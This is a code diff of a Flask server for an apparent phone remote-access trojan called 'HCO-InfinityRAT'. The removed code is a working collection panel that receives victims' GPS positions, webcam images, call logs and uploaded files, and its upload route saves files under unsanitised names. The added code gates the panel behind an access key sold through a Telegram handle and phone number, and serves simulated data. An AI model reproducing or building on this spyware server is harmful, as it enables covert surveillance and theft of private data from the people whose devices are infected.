@@ -1,81 +1,99 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template_string, jsonify
+from datetime import datetime
+from dotenv import load_dotenv
 import os
-import base64
+
+# ===== Load Access Key from .env =====
+load_dotenv()
+ACCESS_KEY = os.getenv("HCO_ACCESS_KEY", "")
+authenticated_clients = set()
 
 app = Flask(__name__)
 
-UPLOAD_FOLDER = "uploads"
-os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+# ===== TEMPLATES =====
+login_html = '''
+<head><title>HCO-InfinityRAT</title><link rel="icon" href="https://i.imgur.com/Vh3Yh4B.png"></head>
+<h2>🔐 Enter Access Key</h2>
+<form method="POST">
+    <input type="password" name="key" placeholder="Access Key" required>
+    <input type="submit" value="Unlock">
+</form>
+<p>📩 DM <b>@HackersColony</b> on Telegram or WhatsApp <b>+91 8420611159</b> to get your key.</p>
+'''
 
-@app.route('/')
-def index():
-    return render_template_string("""
-    <h2>📡 HCO-InfinityRAT Control Panel</h2>
-    <ul>
-        <li><a href='/gps'>📍 View GPS Logs</a></li>
-        <li><a href='/webcam'>📷 View Webcam Captures</a></li>
-        <li><a href='/files'>📁 Browse Files</a></li>
-        <li><a href='/calls'>📞 View Call Logs</a></li>
-    </ul>
-    """)
+panel_html = '''
+<h1>✅ Welcome to HCO-InfinityRAT Control Panel</h1>
+<ul>
+    <li><a href="/gps">📍 GPS Location</a></li>
+    <li><a href="/webcam">📷 Capture Webcam</a></li>
+    <li><a href="/files">📁 File Browser</a></li>
+    <li><a href="/calls">📞 Call Logs</a></li>
+    <li><a href="/logout">🚪 Logout</a></li>
+</ul>
+'''
 
-@app.route('/upload', methods=['POST'])
-def upload():
-    file = request.files['file']
-    path = os.path.join(UPLOAD_FOLDER, file.filename)
-    file.save(path)
-    return 'File received'
-
-@app.route('/gps', methods=['GET', 'POST'])
-def gps():
-    if request.method == 'POST':
-        data = request.form.get('data')
-        with open(f"{UPLOAD_FOLDER}/gps.txt", "a") as f:
-            f.write(data + "\n")
-        return 'GPS Saved'
-    else:
-        try:
-            with open(f"{UPLOAD_FOLDER}/gps.txt") as f:
-                content = f.read().replace("\n", "<br>")
-        except FileNotFoundError:
-            content = "No GPS data."
-        return f"<h3>GPS Logs</h3><p>{content}</p>"
-
-@app.route('/webcam', methods=['POST', 'GET'])
-def webcam():
-    if request.method == 'POST':
-        image_data = base64.b64decode(request.form['image'])
-        with open(f"{UPLOAD_FOLDER}/webcam.jpg", "wb") as f:
-            f.write(image_data)
-        return 'Webcam image saved'
-    else:
-        if os.path.exists(f"{UPLOAD_FOLDER}/webcam.jpg"):
-            return '<img src="/static/webcam.jpg">'
+# ===== ROUTES =====
+@app.route("/", methods=["GET", "POST"])
+def home():
+    client_ip = request.remote_addr
+    if request.method == "POST":
+        key = request.form.get("key")
+        if key == ACCESS_KEY:
+            authenticated_clients.add(client_ip)
+            log_login(client_ip)
         else:
-            return 'No webcam image.'
+            return "<h3>❌ Invalid Key</h3><p>Ask @HackersColony on Telegram for a valid access key.</p>"
 
-@app.route('/calls', methods=['POST', 'GET'])
-def calls():
-    if request.method == 'POST':
-        call_log = request.form.get('data')
-        with open(f"{UPLOAD_FOLDER}/calls.txt", "a") as f:
-            f.write(call_log + "\n")
-        return 'Call logs received'
-    else:
-        try:
-            with open(f"{UPLOAD_FOLDER}/calls.txt") as f:
-                logs = f.read().replace("\n", "<br>")
-        except FileNotFoundError:
-            logs = "No call logs yet."
-        return f"<h3>Call Logs</h3><p>{logs}</p>"
+    if client_ip not in authenticated_clients:
+        return login_html
 
-@app.route('/files', methods=['GET'])
+    return panel_html
+
+@app.route("/logout")
+def logout():
+    client_ip = request.remote_addr
+    authenticated_clients.discard(client_ip)
+    return "<h3>👋 Logged out.</h3><a href='/'>Back to login</a>"
+
+@app.route("/gps")
+def gps():
+    if request.remote_addr not in authenticated_clients:
+        return "❌ Unauthorized"
+    return jsonify({
+        "lat": "28.7041",
+        "lon": "77.1025",
+        "timestamp": datetime.now().isoformat()
+    })
+
+@app.route("/webcam")
+def webcam():
+    if request.remote_addr not in authenticated_clients:
+        return "❌ Unauthorized"
+    return "<h3>📷 Webcam image will be shown here (simulation)</h3>"
+
+@app.route("/files")
 def files():
-    try:
-        files = os.listdir(UPLOAD_FOLDER)
-        return "<h3>Uploaded Files</h3>" + "<br>".join(files)
-    except Exception as e:
-        return f"Error: {e}"
+    if request.remote_addr not in authenticated_clients:
+        return "❌ Unauthorized"
+    fake_files = ["Download/", "Pictures/", "Android/", "secret.txt"]
+    return "<h4>📁 File List:</h4><pre>" + "\n".join(fake_files) + "</pre>"
 
-if __name__ == '__main__':
+@app.route("/calls")
+def calls():
+    if request.remote_addr not in authenticated_clients:
+        return "❌ Unauthorized"
+    call_logs = [
+        "📞 +918888000111 - Incoming - 2 min",
+        "📞 +917777000222 - Missed",
+        "📞 +919999000333 - Outgoing - 5 min"
+    ]
+    return "<h4>📞 Call Logs:</h4><pre>" + "\n".join(call_logs) + "</pre>"
+
+# ===== Logger =====
+def log_login(ip):
+    with open("access_log.txt", "a") as log:
+        log.write(f"[{datetime.now()}] Access granted to IP: {ip}\n")
+
+# ===== MAIN =====
+if __name__ == "__main__":
     app.run(host="0.0.0.0", port=22533)
